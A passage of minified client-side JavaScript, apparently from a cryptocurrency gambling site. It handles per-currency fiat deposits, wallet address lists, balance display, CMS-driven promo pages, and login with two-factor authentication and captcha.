            }), l.set("expiration_YY", i[6].val)), l.set("method", e.dataset.m), c = "/deposit/scash/index.php", n = 2
        }
        if ("USD" == setPaysCurrency) {
            c = "/deposit/smile/index.php", l.set("currency", setPaysCurrency);
            let e = document.getElementById("img_dep_f77").dataset.a;
            l.set("method", e), s = document.getElementById("usd_document_id"), i.push({
                val: s.value,
                obj: s
            }), s = document.getElementById("usd_document_type"), i.push({
                val: chFDV7(s.innerHTML, 1),
                obj: s.parentNode
            }), l.set("type", i[1].val), l.set("number", i[0].val), l.set("email", objUserInfo.email)
        }
        if ("PEN" == setPaysCurrency) {
            c = "/deposit/smile/index.php", l.set("currency", setPaysCurrency);
            let e = document.getElementById("img_dep_f77").dataset.a;
            l.set("method", e), s = document.getElementById("pen_document_id"), i.push({
                val: s.value,
                obj: s
            }), s = document.getElementById("pen_document_type"), i.push({
                val: chFDV7(s.innerHTML, 1),
                obj: s.parentNode
            }), l.set("type", i[1].val), l.set("number", i[0].val), l.set("email", objUserInfo.email)
        }
        if ("CLP" == setPaysCurrency) {
            let e = document.getElementById("img_dep_f77").dataset.a;
            "Wallet" == e || "Cash" == e ? (c = "/deposit/smile/index.php", l.set("currency", setPaysCurrency), l.set("method", e), s = document.getElementById("clp_document_id"), i.push({
                val: s.value,
                obj: s
            }), s = document.getElementById("clp_document_type"), i.push({
                val: chFDV7(s.innerHTML, 1),
                obj: s.parentNode
            }), s = document.getElementById("clp_fname1"), i.push({
                val: s.value,
                obj: s
            }), s = document.getElementById("clp_lname1"), i.push({
                val: s.value,
                obj: s
            }), l.set("name", i[2].val + " " + i[3].val), l.set("type", i[1].val), l.set("number", i[0].val), l.set("email", objUserInfo.email), "Wallet" == e ? (s = document.getElementById("clp_channel"), i.push({
                val: chFDV7(s.innerHTML, 1),
                obj: s.parentNode
            }), l.set("channel", i[4].val)) : (s = document.getElementById("clp_p_card"), i.push({
                val: s.value,
                obj: s
            }), l.set("phone", i[4].val))) : (c = isNaN(Number(e)) ? "/deposit/paycos/index.php" : "/deposit/payku/index.php", l.set("method", e), l.set("currency", setPaysCurrency), s = document.getElementById("clp_e_m"), i.push({
                val: s.value,
                obj: s
            }), l.set("email", i[0].val), n = 1)
        }
        let d = "";
        if ("BRL" == setPaysCurrency) {
            c = "/deposit/smile/index.php";
            let e = chFDV7(document.getElementById("img_dep_f77").getAttribute("alt"), 2);
            l.set("currency", setPaysCurrency);
            let t = document.getElementById("img_dep_f77").dataset.a;
            if ("1" == t) {
                c = "/deposit/deca/index.php";
                let e = "pix";
                n = 1, l.set("payment_method", e)
            } else l.set("method", e);
            "PIX" == e && "1" != t && (d = "PIX", s = document.getElementById("pix_document_id1"), user_creds || (user_creds = {}), user_creds.d = user_creds.d || {}, user_creds.d.pix = user_creds.d.pix || {}, user_creds.d.pix.number = s.value, i.push({
                val: s.value,
                obj: s
            }), l.set("number", i[0].val), s = document.getElementById("pix_fname1"), i.push({
                val: s.value,
                obj: s
            }), s = document.getElementById("pix_lname1"), i.push({
                val: s.value,
                obj: s
            }), l.set("name", i[1].val + " " + i[2].val), l.set("email", objUserInfo.email))
        }
        if (i.forEach((t => {
                "" != t.val && NaN != t && null != t || (createNotifyL(1, lp["Not all fields"], lp.Error), t.obj.classList.add("err756"), stFiD555 = 0, e && (e.disabled = !1), o = 2)
            })), 1 == o) {
            if (i.forEach((e => {
                    NaN != e && null != e && e.obj.classList.remove("err756")
                })), 0 != exrPageDep) return stFiD555 = 0, void openDepExtraI(e);
            r.classList.remove("err756");
            let s = await axios({
                method: "post",
                url: c,
                data: l,
                headers: {
                    "Content-Type": "multipart/form-data"
                }
            }).catch((function(t) {
                e && (e.disabled = !1), stFiD555 = 0, createNotifyL(1, t.message, lp.Error)
            }));
            if (stFiD555 = 0, e && (e.disabled = !1), 0 == s.data.error) {
                if (0 != a) return await openVeriff(a), void document.getElementById("frame_p234").setAttribute("src", s.data.url);
                if (2 == n) return void createNotifyL(2, s.data.message, lp.Success);
                if (1 == n) return void setTimeout((() => {
                    window.location = s.data.url
                }), 0);
                if ("PIX" == d) {
                    let e = document.getElementsByClassName("fiat_dep_m4")[0];
                    e && (e.style.display = "none"), e = document.getElementsByClassName("pix_main_info")[0], e && (e.style.display = "none"), e = document.getElementsByClassName("pix_main_img")[0], e && (e.style.display = "block"), e = document.getElementsByClassName("pix_qrc_img")[0], e && e.setAttribute("src", s.data.qr_code_img), e = document.getElementsByClassName("pixLinkP")[0], e && (e.innerHTML = s.data.qr_code), e = document.getElementById("pix_qrc_co"), e && (e.innerHTML = s.data.qr_code), e = document.getElementsByClassName("pixMinP")[0], e && (e.innerHTML = Number(t))
                } else setTimeout((() => {
                    window.open(s.data.url, "_blank")
                }), 0)
            } else createNotifyL(1, s.data.message, lp.Error)
        }
    }, createBtnPays = () => {
        let e = document.getElementsByClassName("listb_fiat")[0];
        e.innerHTML = "";
        let t = "";
        if (null == depwith[setPaysCurrency]) return;
        let s = {
                USD: {
                    btnList: [10, 25, 50, 100, 150, 250]
                },
                PEN: {
                    btnList: [50, 100, 150, 250, 500, 1e3]
                },
                CLP: {
                    btnList: [5e3, 1e4, 15e3, 3e4, 5e4, 1e5]
                },
                CAD: {
                    btnList: [10, 25, 50, 100, 150, 250]
                },
                AZN: {
                    btnList: [50, 100, 150, 250, 500, 1e3]
                },
                BDT: {
                    btnList: [1e3, 2500, 5e3, 7500, 1e4, 2e4]
                },
                KES: {
                    btnList: [500, 1e3, 2500, 3500, 5e3, 1e4]
                },
                NGN: {
                    btnList: [500, 1e3, 2500, 3500, 5e3, 1e4]
                },
                KZT: {
                    btnList: [3e3, 6e3, 1e4, 3e4, 5e4, 8e4]
                },
                EUR: {
                    btnList: [10, 25, 50, 100, 150, 250]
                },
                IDR: {
                    btnList: [1e5, 5e5, 75e4, 1e6, 25e5, 5e6]
                },
                INR: {
                    btnList: [500, 1e3, 1500, 2e3, 3e3, 5e3]
                },
                PHP: {
                    btnList: [300, 500, 750, 1e3, 2500, 5e3]
                },
                THB: {
                    btnList: [100, 250, 500, 750, 1e3, 2500]
                },
                JPY: {
                    btnList: [100, 250, 500, 750, 1e3, 2500]
                },
                VND: {
                    btnList: [1e4, 5e4, 75e3, 1e5, 15e4, 25e4]
                },
                MYR: {
                    btnList: [10, 25, 50, 100, 150, 250]
                },
                UAH: {
                    btnList: [200, 500, 750, 1e3, 2500, 5e3]
                },
                RUB: {
                    btnList: [1e3, 2500, 5e3, 7500, 1e4, 25e3]
                },
                BRL: {
                    btnList: [50, 100, 150, 250, 500, 1e3]
                },
                UZS: {
                    btnList: [5e3, 1e4, 15e3, 25e3, 5e4, 75e3]
                },
                GEL: {
                    btnList: [1e3, 1500, 2e3, 2500, 5e3, 7500]
                },
                CNY: {
                    btnList: [1e3, 1500, 2e3, 2500, 5e3, 7500]
                },
                AUD: {
                    btnList: [10, 25, 50, 100, 150, 250]
                },
                NZD: {
                    btnList: [10, 25, 50, 100, 150, 250]
                },
                TRY: {
                    btnList: [100, 250, 500, 750, 1e3, 2500]
                }
            },
            a = "",
            n = "";
        String(s[setPaysCurrency].btnList[0]).length > 6 && (t = ""), s[setPaysCurrency].btnList.forEach((e => {
            a = 0 != chBoI.min && Number(chBoI.min) * listCurs.data.rates[setPaysCurrency] < e ? `<span>+${chBoI.am}</span>` : "", n += `<button class='fiat_fast fiat_f_${e}' type="button" data-cou=0 onclick="addCountFiat(${e},'amountFiatDep456')" >${a}${currencyAbbreviations[setPaysCurrency]}${e}${t}</button>`
        })), e.innerHTML = n, setTimeout((() => {
            addCountFiat(s[setPaysCurrency].btnList[1], "amountFiatDep456")
        }), 1)
    }, addCountFiat = (e, t) => {
        let s = document.getElementById("amountFiatDep"),
            a = document.getElementsByClassName("fiat_f_" + e)[0];
        if (!Number(a.dataset.cou)) {
            let n = document.getElementsByClassName("fiat_fast");
            Array.from(n).forEach((e => {
                e.dataset.cou = 0, e.classList.remove("active")
            })), a.dataset.cou = 1, a.classList.add("active");
            let r = e;
            t = (t = document.getElementsByClassName(t)[0]).dataset.countMax, Number(r) > Number(t) ? s.value = Number(t) : s.value = r
        }
        chInpD56(s)
    };
async function getBalanceUser(e, t, s) {
    bodyFormData = new FormData, bodyFormData.set("action", "userMoney"), await axios({
        method: "post",
        url: "/user/func.php",
        data: bodyFormData,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).then((a => {
        if (0 == a.data.error) {
            let n = a.data;
            setUserLvl(n), delete n.userLevel, delete n.userLevelProc, delete n.user_creds, delete n.error, delete n.current, JETblock = n.JETblock, delete n.JETblock, arrayCurrency = Object.entries(n), arrayCurrency.forEach((a => {
                if (e == a[0]) {
                    if (1 == t) {
                        upMoneyCoins(arrayCurrency), 1 == stBal0 && (getCurs0(2), getCurs0(1)), 1 == stBalUsd && (getUSD(2), getUSD(1));
                        let e = window.truncatorJet(a[1], 8);
                        2 == s && (document.getElementById("with_inp_bal").innerHTML = e), 4 == s && (document.getElementById("swap_inp_bal").innerHTML = e), 1 == s && (document.getElementById("deps_inp_bal").innerHTML = e), 7 == s && (document.getElementById("deps_inp_fiat").innerHTML = e), 8 == s && (document.getElementById("with_inp_fiat").innerHTML = e)
                    }
                    if (2 == t) {
                        document.getElementById("chat_drop_bal5").innerHTML = window.truncatorJet(a[1], 8) + " " + e, document.getElementById("coin_cur103").innerHTML = e;
                        let t = Number(listCurs.data.rates[e]) * Number(.1);
                        t = Number(t).toFixed(8), curDrop = e, document.getElementById("drop_coin_co").innerHTML = t, document.getElementById("drop_amount_co1").value = t, coinsDropVal = t, document.getElementById("chat_cur_am2").innerHTML = t + " " + e, checkBtnDrop()
                    }
                }
            })), arrayCurrency = arrayCurrency.filter((e => -1 == arrayCurrencyFiat.findIndex((t => t[0] == e[0]))))
        }
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }))
}
let swapName = "",
    getSetSwap = e => {
        arrayCurrency.forEach((t => {
            if ("JET" == t[0]) {
                swapName = e, document.getElementById("swap_bal1").innerHTML = window.truncatorJet(t[1], betListCur.JET.precision);
                let s = document.getElementById("swap_amount");
                changeSwapA(s), document.getElementById("swap_trans1").innerHTML = window.truncatorJet(Number(listCurs.data.rates[e], betListCur[e].precision)) + " " + e
            }
        }))
    },
    copyAddress = e => {
        copyToClip(e.nextSibling), createNotifyL(2, "", lp.Success)
    };

function copyToClip(e) {
    var t, s, a = "_hiddenCopyText_",
        n = "INPUT" === e.tagName || "TEXTAREA" === e.tagName;
    if (n) r = e, t = e.selectionStart, s = e.selectionEnd;
    else {
        if (!(r = document.getElementById(a))) {
            var r = document.createElement("textarea");
            r.style.position = "absolute", r.style.left = "-9999px", r.style.top = "0", r.id = a, document.body.appendChild(r)
        }
        r.textContent = e.textContent
    }
    var o, i = document.activeElement;
    r.focus(), r.setSelectionRange(0, r.value.length);
    try {
        o = document.execCommand("copy")
    } catch (e) {
        o = !1
    }
    return i && "function" == typeof i.focus && i.focus(), n ? e.setSelectionRange(t, s) : r.textContent = "", o
}
let seeCode = (e, t) => {
    "password" == e.previousSibling.type ? (e.style.fill = "#ffffff", e.previousSibling.type = "text") : (e.previousSibling.type = "password", e.style.fill = "")
};

function getAdrList(e, t, s) {
    let a = new FormData;
    a.set("network", t), a.set("typepay", e), a.set("action", "walletAddrGet"), axios({
        method: "post",
        url: " /user/func.php",
        data: a,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).then((async function(a) {
        if (a = a.data, 3 == s) {
            let e = document.getElementById("adr_empty_cur1"),
                t = document.getElementById("adr_list_cur1");
            t.innerHTML = "", 0 == a.length ? (e.style.display = "flex", t.style.display = "none") : (e.style.display = "none", t.style.display = "block", a.forEach((e => {
                t.innerHTML += `<div data-v-05b4e26f="" class="address_item">\n            <div data-v-05b4e26f="" class="address_item_left">\n            <div data-v-05b4e26f="" class="address_name">${e.title}</div>\n            </div> <div data-v-05b4e26f="" class="address_item_right">\n            <span data-v-05b4e26f="" class="short_address">${e.addr.substr(0,2)} ... ${e.addr.substr(e.addr.length-3)}</span>\n            <div type="text" style='display:none'>${e.addr}</div> \n            <button onclick="copyToClip(this.previousSibling.previousSibling);createNotifyL(2, '', lp['Success'])" data-v-0c03a553="" type="button" size="sm" icon="icon-copy" class="button btn btn_small btn_copy button_sm button_blue">\n            <i data-v-0c03a553=""><svg data-v-0c03a553="" focusable="false" aria-hidden="true" class="">\n            <use data-v-05b4e26f="" xlink:href="/assets/const/svg-sprite1.svg#icon-copy"></use></svg>\n            </i> </button> \n            <button onclick='askUser(addListDel,1,${e.id},this.parentNode.parentNode)' data-v-0c03a553="" type="button" size="sm" icon="icon-delete" class="button btn btn_small btn_delete button_sm button_blue">\n            <i data-v-0c03a553="">\n            <svg data-v-0c03a553="" focusable="false" aria-hidden="true" class="">\n            <use data-v-05b4e26f="" xlink:href="/assets/const/svg-sprite.2f4e1f8f.svg#icon-delete"></use></svg></i> \n            </button>\n            </div></div>`
            })))
        }
        if (2 == s) {
            let s = document.getElementById("with_btn_list"),
                n = document.getElementById("with_list_ul");
            n.innerHTML = "", 0 == a.length ? s.style.display = "none" : (s.style.display = "block", a.forEach((e => {
                n.innerHTML += `\n            <li onclick="setAdressWith('${e.addr}');openWithListDrop()" data-v-7e7e0a9e="" class="vertical-menu__item">\n            <button data-v-7e7e0a9e="" class="vertical-menu__link">\n            <div data-v-c3338cbe="" class="address-item"><div data-v-c3338cbe="" class="address-item__title">${e.title}</div> \n            <div data-v-c3338cbe="" class="address-item__address">\n            ${e.addr}\n            </div>\n            </div>\n            </button>\n            </li>`
            }))), document.getElementsByClassName("inp_XRP1")[0].style.display = "XRP" == e ? "block" : "none";
            let r = document.getElementsByClassName("dptText");
            Array.from(r).forEach((s => {
                s.classList.contains("dpt" + e + t) ? s.style.display = "inline-block" : s.style.display = "none"
            }));
            let o = depwith;
            "ERC20" == t && "USDT" == e && (e = "USDTE"), "TRC20" == t && "USDT" == e && (e = "USDTT"), document.getElementsByClassName("with_min117")[0].innerHTML = o[e].out[0] + " " + e, document.getElementsByClassName("with_min117")[0].dataset.count = o[e].out[0], document.getElementsByClassName("with_min117")[0].dataset.countMax = o[e].out[1], document.getElementsByClassName("with_min117")[0].dataset.name = e, document.getElementsByClassName("with_confirm117")[0].innerHTML = o[e].confirm, document.getElementsByClassName("with_fee117")[0].innerHTML = o[e].out_fee + " " + e, document.getElementsByClassName("with_cur117")[0].innerHTML = e, document.getElementById("with_amount").dataset.cur = e
        }
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }))
}
let setAdressWith = e => {
    e = chFDV7(e, 1), document.getElementById("with_address").value = e
};
window.openhrefB77 = () => {
    history.back()
};
let openPromDets = async e => {
    if (pageNameM == "promo=" + e) return;
    burgerSt && isMobile() && burgerDesc();
    let t = gD("coins_preloadOpen"),
        s = () => {
            closeHistory(pageNameM, 2), pageNameM = "Promo", openHistory("?promo", 2), t.style.display = "", gC("promo2_mm")[0].style.display = "block"
        },
        a = gC("prom2_mm");
    if (Array.from(a).forEach((e => e.style.display = "none")), 1 == e) return void s();
    t.style.display = "flex";
    let n;
    e = decodeURIComponent(e), n = -1 != ["en", "pt", "ru"].findIndex((e => e == lngGame)) ? lngGame.toUpperCase() : "EN";
    let r = encodeURIComponent("*[lng == '" + n + "'&&keyL=='" + e + "']"),
        o = await axios.get(`https://qd4ujjl1.api.sanity.io/v2021-10-21/data/query/production?query=${r}`).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }));
    if (o = o.data.result[0], !o || !o.title) return void s();
    pageNameM = "promo=" + e, gD("ti_tour54").innerHTML = o.title;
    let i = `https://cdn.sanity.io/images/qd4ujjl1/production/${o.mainImage.asset._ref.replace("image-","").replace("-png","")}.png`;
    gD("im_tour54").setAttribute("src", i);
    let l = "";
    l = function(e = []) {
        return e.map((e => {
            if ("block" !== e._type || !e.children) return "";
            let t = 0;
            e.children.forEach((e => e.marks.forEach((e => {
                "strong" == e && (t = 1)
            }))));
            let s = e.children.map((e => e.text)).join(" ");
            if (e.markDefs[0] && "link" == e.markDefs[0]._type) {
                let t = e.markDefs[0].href,
                    a = `href="${e.markDefs[0].href}"`;
                if (-1 != t.indexOf("?gamelink=")) {
                    let e = t.split("?gamelink=")[1].split("&")[0].split("#")[0];
                    try {
                        e = window.atob(e), a = `onclick="pageNameM='hrefB77';openBannerG('${e}')"`
                    } catch (e) {}
                }
                s = "<a " + a + ">" + s + "</a>"
            }
            return "h2" == e.style && (s = "<h2>" + s + "</h2>"), "bullet" == e.listItem && (s = "<li>" + s + "</li>"), 1 == t && (s = "<strong>" + s + "</strong>"), s
        })).join("<p>")
    }(o.body), gD("co_tour54").innerHTML = l, a = gC("pr223_m")[0], a && (a.style.display = "block"), t.style.display = "", window.scrollTo(0, 0), openHistory("?promo=" + e, 2)
}, openWithListDrop = () => {
    let e = document.getElementById("with_list_m");
    "block" == e.style.display ? e.style.display = "none" : e.style.display = "block"
}, addListDel = (e, t) => {
    let s = new FormData;
    s.set("id", e), s.set("action", "walletAddrDel"), axios({
        method: "post",
        url: " /user/func.php",
        data: s,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).then((async function(e) {
        if (0 == (e = e.data).error) {
            e = e.data, t.outerHTML = "";
            let s = document.getElementById("adr_empty_cur1"),
                a = document.getElementById("adr_list_cur1");
            "" == a.innerHTML && (s.style.display = "flex", a.style.display = "none")
        } else createNotifyL(1, e.data.message, lp.Error)
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }))
};

function getAdrDep(e, t) {
    let s = new FormData;
    s.set("network", t), s.set("typepay", e);
    let a = gD("coins_preloadOpen");
    a.style.display = "flex";
    let n = gC("dptText");
    Array.from(n).forEach((s => {
        s.classList.contains("dpt" + e + t) ? s.style.display = "inline-block" : s.style.display = "none"
    })), gD("spanCr2_i23").setAttribute("src", "/assets/coins/" + e + ".svg"), gD("spanCr2_i29").setAttribute("src", "/assets/coins/" + e + ".svg");
    let r, o, i, l = gC("dep_input_adress")[0],
        c = gD("crypDep768");
    l.style.display = "block", c.style.display = "none", l.value = "", axios({
        method: "post",
        url: "/deposit/ccp/index.php",
        data: s,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).then((async function(s) {
        if (a.style = "", 0 == s.data.error) {
            if (r = Number(l.offsetWidth) - 20, "XRP" == e ? (o = s.data.addr.split("|")[1], gC("dep_input_adress")[1].value = s.data.addr.split("|")[0]) : o = s.data.addr, i = Math.floor(r / 8), c.innerHTML = o, gD("crypDep777").value = o, o.length > i) {
                let e = Math.floor((i - 3) / 2),
                    t = i - 3 - e;
                o = o.substr(0, e) + "..." + o.substr(-t)
            } else l.onclick = e => {
                disBlockEv(e), e.currentTarget.previousSibling.previousSibling.previousSibling.click()
            }, c.onclick = e => {
                disBlockEv(e)
            };
            l.value = o, "ERC20" == t && "USDT" == e && (e = "USDTE"), "TRC20" == t && "USDT" == e && (e = "USDTT"), gC("dep_confirm117")[0].innerHTML = depwith[e].confirm;
            let a = {
                BTC: "bitcoin",
                LTC: "litecoin",
                ETH: "ethereum",
                BCH: "bitcoincash",
                DOGE: "dogecoin"
            };
            e in a ? (gD("dep_img_qr").setAttribute("src", "/site/qr.php?t=" + window.btoa(a[e] + ":" + s.data.addr)), gD("dep_a_qr").style.display = "block") : (gD("dep_img_qr").setAttribute("src", "/site/qr.php?t=" + window.btoa(s.data.addr)), gD("dep_a_qr").style.display = "block")
        }
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }))
}
let faLogin = 0,
    open2faLog = () => {
        let e = document.getElementsByClassName("2fa_login21")[0];
        e.style.display = "block", e = document.getElementById("mobile-login-wrapper"), e.style.display = "none", e = document.getElementById("mobile-password-wrapper"), e.style.display = "none", faLogin = 1, closeHistory("&signin"), openHistory("?" + window.location.href.split("?")[1] + "&sign2FA", 1)
    },
    setOffUser = () => {
        if ("1" == window.user_il) {
            let e = document.getElementsByClassName("user_not");
            Array.from(e).forEach((e => {
                e.classList.add("off")
            })), e = document.getElementsByClassName("user_in"), Array.from(e).forEach((e => {
                e.classList.remove("off")
            }))
        } else {
            let e = document.getElementsByClassName("user_not");
            Array.from(e).forEach((e => {
                e.classList.remove("off")
            })), e = document.getElementsByClassName("user_in"), Array.from(e).forEach((e => {
                e.classList.add("off")
            }))
        }
    },
    gdataLayer3 = e => {
        dataLayer.push({
            event: "gaTriggerEvent",
            gaEventCategory: "form_send",
            gaEventAction: e
        })
    };
async function loginl(t) {
    let s = document.getElementById("login_send10");
    if (faLogin) {
        let e = new FormData;
        e.set("action", "connect2fa"), e.set("code", document.getElementById("2fa_login50").value), await axios({
            method: "post",
            url: "/user/func.php",
            data: e,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).then((async function(e) {
            if (s && (s.disabled = !1), parseInt(e.data.id[0], 10)) createNotifyL(1, e.data.m, lp.Error);
            else {
                gdataLayer3("Log_in"), localStorage.setItem("entry99", 0), (statusGameOPEN || -1 == window.location.href.indexOf("&sign2FA")) && location.reload();
                let e = lngGame;
                await setUserInfo(), lngGame != e && location.reload(), faLogin = 0, document.getElementsByTagName("body")[0].classList.add("user_site"), closeMobileLogin(), window.user_il = 1, user_in = window.user_il, setOffUser(), pageNameM = void 0, checkPage(), getNotifyMes()
            }
        })).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }))
    } else {
        s && (s.disabled = !0);
        let a = "mobile-login-wrapper";
        pass = "mobile-password-wrapper", a = document.getElementById(a), pass = document.getElementById(pass);
        let n = a.querySelectorAll(".inputVal8")[0].value,
            r = pass.querySelectorAll(".inputVal8")[0].value;
        if (r.length < 6 && (pass.classList.add("_1rJPL"), s && (s.disabled = !1)), r.length > 5) {
            a.classList.remove("_1rJPL"), pass.classList.remove("_1rJPL");
            let o = new FormData;
            o.set("uLogin", n), o.set("uPassword", r), o.set("action", "connect"), o.set("h-recaptcha-response", t);
            let i = gD("coins_preloadOpen");
            i && (i.style.display = "flex"), await axios({
                method: "post",
                url: "/user/func.php",
                data: o,
                headers: {
                    "Content-Type": "multipart/form-data"
                }
            }).then((async e => {
                if (parseInt(e.data.id[0], 10)) s && (s.disabled = !1), i && (i.style.display = ""), pass.querySelectorAll(".inputVal8")[0].value = "", a.classList.add("_1rJPL"), pass.classList.add("_1rJPL"), createNotifyL(1, e.data.m, lp.Error);
                else if (status2FA = e.data["2fa"], 1 == status2FA) s && (s.disabled = !1), i && (i.style.display = ""), open2faLog();
                else {
                    gdataLayer3("Log_in"), localStorage.setItem("entry99", 0), (statusGameOPEN || -1 == window.location.href.indexOf("&signin")) && location.reload();
                    let e = lngGame;
                    await setUserInfo(), lngGame != e && location.reload(), closeMobileLogin(), document.getElementsByTagName("body")[0].classList.add("user_site"), window.user_il = 1, user_in = window.user_il, setOffUser(), pageNameM = void 0, checkPage(), getNotifyMes(), s && (s.disabled = !1), i && (i.style.display = "")
                }
            })).catch((function(t) {
                i && (i.style.display = ""), s && (s.disabled = !1), createNotifyL(1, e.message, lp.Error)
            }))
        }
    }
}
let closeCaptn1 = () => {
        document.getElementsByClassName("modal_extraCaptcha")[0].classList.remove("active"), 1 != modalOpen && errUnFixCoins()
    },
    uasjf99 = 0,
    sendcaptch11 = (e, t) => {
        uasjf99 = e, document.getElementsByClassName("modal_extraCaptcha")[0].classList.add("active"), errFixCoins(), IconCaptcha.instances ? IconCaptcha.reset() : IconCaptcha.init(".iconcaptcha-holder", {
            general: {
                validationPath: "/captcha/captcha-request.php",
                fontFamily: "Poppins",
                credits: "show"
            },
            security: {
                clickDelay: 500,
                hoverDetection: !0,
                enableInitialMessage: !0,
                initializeDelay: 500,
                selectionResetDelay: 3e3,
                loadingAnimationDelay: 1e3,
                invalidateTime: 12e4
            },
            messages: {
                initialization: {
                    verify: "Click here to verify",
                    loading: "Loading challenge..."
                },
                header: "Select the image displayed the <u>least</u> amount of times",
                correct: "Verification complete.",
                incorrect: {
                    title: "Uh oh.",
                    subtitle: "You've selected the wrong image."
                },
                timeout: {
                    title: "Please wait 60 sec.",
                    subtitle: "You made too many incorrect selections."
                }
            }
        }).bind("success", (function(e) {
            let s = document.getElementById("formcap"),
                a = new FormData(s);
            1 == uasjf99 && sendPromoF(a, t), 2 == uasjf99 && rainSubmit(a), 4 == uasjf99 && uploadFile(a), closeCaptn1()
        }))
    },
    exitUser = () => {
        let e = gD("coins_preloadOpen");
        e && (e.style.display = "flex"), axios({
            method: "get",
            url: "/user/exit/"
        }).then((function() {
            location.reload()
        })).catch((function(t) {
            e && (e.style.display = ""), createNotifyL(1, t.message, lp.Error)
        }))
    },
    chatSupp = 0;
Intercom && Intercom("onShow", (function() {
    chatSupp = 1
}));
let chatHelpOpen = () => {
        let e = document.getElementsByClassName("support_desctop_i")[0];
        chatSupp ? (Intercom("hide"), chatSupp = 0, window.innerWidth > 1024 && 2 == statusChatGame && (e.style = "display:none!important")) : (Intercom("show"), chatSupp = 1, window.innerWidth > 1024 && 2 == statusChatGame && (e.style = ""))
    },
    loginCheck = e => {
        -1 != e.currentTarget.value.indexOf("@") && -1 != e.currentTarget.value.indexOf(".") && e.currentTarget.parentNode.classList.remove("_1rJPL")
    },
    passwordCheck = (e, t) => {
        t || (t = 7), e.currentTarget.value.length > t && e.currentTarget.parentNode.classList.remove("_1rJPL")
    },
    countR = 0,
    openSign = async () => {
        let e = document.getElementsByClassName("registr-content21")[0];
        if (!countR) {
            let t = await axios.get("/modals/registration1.php?x=55").catch((function(e) {
                createNotifyL(1, e.message, lp.Error)
            }));
            e.innerHTML = t.data
        }
        countR = 1, openHistory("?" + window.location.href.split("?")[1] + "&signup", 1);
        let t = document.getElementsByClassName("navbar-signup-link")[0];
        t && t.classList.add("cugIt"), window.innerWidth < 768 ? e.style.display = "block" : e.style.display = "flex", createTelegScr(1), setTimeout((() => {
            errFixCoins();
            let e = document.getElementsByClassName("bonus-choosen035");
            Array.from(e).forEach((e => {
                if (e.classList.contains("bonus-choosen031")) {
                    let t = e.parentNode.dataset.type;
                    step1.bonuse = t
                }
            }))
        }), 0)
    }, statusSignMod = 1, closeSign = async e => {
        statusSignMod = 1, closeFullSign(), underClose(5)
    };

function closeFullSign(e) {
    errUnFixCoins();
    let t = document.getElementsByClassName("navbar-signup-link")[0];
    t && t.classList.remove("cugIt"), document.getElementsByClassName("registr-content21")[0].style.display = "none", closeHistory("&signup"), 1 == e && (localStorage.setItem("entry99", 1), location.reload())
}
let widgetIDS, widgetIDL, widgetIDP, widgetIDR, openHistory = (e, t) => {
        if (null != previousUrlGame && (previousUrlGame = window.location.href, 1 == t && -1 == previousUrlGame.indexOf("&" + e.split("&")[1]) && ("?undefined" == e.split("&")[0] && (e = "?&" + e.split("&")[1]), burgerSt && isMobile() && burgerDesc(), history.pushState({
                page: 25
            }, "title 25", e), modalOpen = 1), 2 == t)) {
            (-1 == previousUrlGame.indexOf(e) || "" == e) && (history.pushState(null, "title 25", "/" + e), document.cookie = `currentUrl=${window.location.href}; max-age=31536000; path=/`, modalOpen = 0)
        }
        previousUrlGame = window.location.href
    },
    closeHistory = (e, t = 1) => {
        previousUrlGame = window.location.href;
        let s = window.location.href; - 1 != s.indexOf(e) && (s = s.replace(e, "").replace(window.location.origin, ""), history.pushState({
            page: 25
        }, "title 25", s), 1 == t && (modalOpen = 0))
    },
    dropdownText = e => {
        let t = document.getElementsByClassName(e.currentTarget.dataset.dropdown)[0];
        document.getElementsByClassName(e.currentTarget.dataset.arrow)[0];
        "0" == t.dataset.status ? (t.style.display = "none", t.dataset.status = "1", t.closest(".vOQaJ") && t.closest(".vOQaJ").scrollIntoView()) : (t.style.display = "block", t.dataset.status = "0")
    },
    check2fa = async () => {
        if (0 == status2FA) {
            let e = new FormData;
            e.set("action", "on2fa"), await axios({
                method: "post",
                url: "/user/func.php",
                data: e,
                headers: {
                    "Content-Type": "multipart/form-data"
                }
            }).then((async function(e) {
                0 == e.data.error ? (document.getElementById("qr_code25").src = e.data.qr, document.getElementById("qr_secret25").setAttribute("value", e.data.code)) : createNotifyL(1, e.data.message, lp.Error)
            })).catch((function(e) {
                createNotifyL(1, e.message, lp.Error)
            }))
        } else {
            let e = document.getElementsByClassName("twofa_block_not")[0];
            e.style.display = "block", e = document.getElementsByClassName("twofa_block_v")[0], e.style.display = "none"
        }
    }, send2FA = async () => {
        let e = new FormData;
        e.set("action", "activate2fa"), e.set("code", document.getElementById("qr_code").value), e.set("password", document.getElementById("qr_password").value), await axios({
            method: "post",
            url: "/user/func.php",
            data: e,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).then((async function(e) {
            if (0 == e.data.error) {
                let e = document.getElementsByClassName("twofa_block_v")[0];
                e.style.display = "none", e = document.getElementsByClassName("twofa_block_not")[0], e.style.display = "block", status2FA = "1"
            } else createNotifyL(1, e.data.message, lp.Error)
        })).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }))
    }, cancel2FA = async () => {
        let e = new FormData;
        e.set("action", "off2fa"), await axios({
            method: "post",
            url: "/user/func.php",
            data: e,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).then((e => {
            if (0 == e.data.error) {
                status2FA = 0;
                let e = document.getElementsByClassName("twofa_block_not")[0];
                e.style.display = "none", document.getElementById("qr_code").value = "", document.getElementById("qr_password").value = "", e = document.getElementsByClassName("twofa_block_v")[0], e.style.display = "block", check2fa()
            } else createNotifyL(1, e.data.message, lp.Error)
        })).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }))
    }, closeForgot = () => {
        let e = document.getElementById("mobile-block-forgot");
        e.style.display = "none", e.style.height = "", e.style.zIndex = "", errUnFixCoins(), closeHistory("&forgot-password")
    }, openForgot = async () => {
